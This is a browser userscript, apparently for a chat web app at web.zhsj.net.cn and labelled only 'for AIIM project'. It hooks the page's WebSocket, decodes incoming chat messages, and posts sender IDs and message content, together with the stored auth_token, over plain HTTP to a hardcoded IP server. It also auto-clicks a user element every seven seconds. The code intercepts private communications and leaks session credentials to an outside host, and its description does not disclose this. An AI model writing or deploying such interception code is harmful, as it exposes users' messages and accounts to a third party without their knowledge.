// ==UserScript==
// @name         WSHookUP_fat
// @namespace    gx3000
// @version      0.0.1
// @description  for AIIM project
// @author       Pancras
// @run-at       document-start
// @match        http://web.zhsj.net.cn/*
// @require     http://libs.baidu.com/jquery/1.7.2/jquery.min.js
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/465225/WSHookUP_fat.user.js
// @updateURL https://update.greasyfork.org/scripts/465225/WSHookUP_fat.meta.js
// ==/UserScript==

(function($,window,document) {
    'use strict';
    var baseURL = "http://81.68.71.99:12002/";
    var token = localStorage.getItem("auth_token");
    try {
        $(document).ready(function(){
            setInterval(()=>{
                $('.user_active').click();
            },7000)
            $('#app').append("<div id='AIIM' style='position:absolute; top:10%; left: 50%; padding:20px; background-color:red'>正在启动...</div>")
            setTimeout(()=>{
                $.get(baseURL+"contacts?token="+token,function(d,status){
                    $('#AIIM').html(d.message);
                });
            },7000);
            var OriginalWS = window.WebSocket;
            var initOWS = OriginalWS.apply.bind(OriginalWS);
            var wsListener = OriginalWS.prototype.addEventListener;
            wsListener = wsListener.call.bind(wsListener);
            function MyWS(url, opts) {
                var ws;
                if (this instanceof WebSocket) {
                    if (arguments.length === 1) {
                        ws = new OriginalWS(url);
                    } else if (arguments.length >= 2) {
                        ws = new OriginalWS(arguments[0],arguments[1]);
                    } else {
                        ws = new OriginalWS();
                    }
                } else {
                    ws = initOWS(this, arguments);
                }
                wsListener(ws, "message", function(event){
                    if(event.data.byteLength>100){
                        var utf8 = new Uint8Array(event.data.slice(24));
                        var deCodeUtf = new TextDecoder()
                        var str =deCodeUtf.decode(utf8)
                        var res = JSON.parse(str)
                        console.log(res.data)
                        if(res.data['msgContent']){
                            var da = {"botWxid":res.data['botWxid'],"contactId":res.data['contactId'],"senderWxId":res.data['senderWxId'],"msgContent":res.data['msgContent'],"msgId":res.data['msgId']}
                            $.ajax({
                                url:baseURL+"msg?token="+token,
                                type:"POST",
                                data:da,
                                success: function(data){
                                    console.log(data)
                                }
                            });
                        }
                    }
                });
                return ws;
            }
            window.WebSocket = MyWS.bind();
            window.WebSocket.prototype = OriginalWS.prototype;
            window.WebSocket.prototype.constructor = window.WebSocket;
        });
    } catch (error) {
        console.error(error);
    }
})(jQuery,window,document);